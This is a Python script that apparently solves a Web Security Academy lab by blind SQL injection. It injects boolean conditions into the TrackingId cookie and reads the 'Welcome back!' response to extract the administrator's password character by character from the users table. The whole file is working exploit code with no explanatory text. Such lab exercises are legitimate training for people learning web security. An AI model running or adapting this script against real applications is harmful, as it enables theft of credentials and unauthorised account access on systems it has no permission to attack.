import requests
import string
from colorama import Fore, Back, Style
url = "https://0a8d00030324838d81d8077a006a0058.web-security-academy.net/"

def enum(value):
	cookies = {'TrackingId':f"k5mr8wHOHor68sUI'{value}"}
	response = requests.get(url, cookies=cookies)
	return "Welcome back!" in response.text
	
chars= string.ascii_letters+string.digits
password=""
for i in range(1,21):
	for value in chars:
		query = f" AND (SELECT Substring(password, {i}, 1) from users where username='administrator')='{value}'--"
		if enum(query) is True:
			password+=value
			print(f" {Fore.GREEN} charcter {value} is match for the position {i} in the password")
			break
		else:
			print(f"{Fore.RED} charcter {value} is not match for the position {i} {Style.RESET_ALL}")

print(f"\n [+] {Fore.CYAN} password {password}")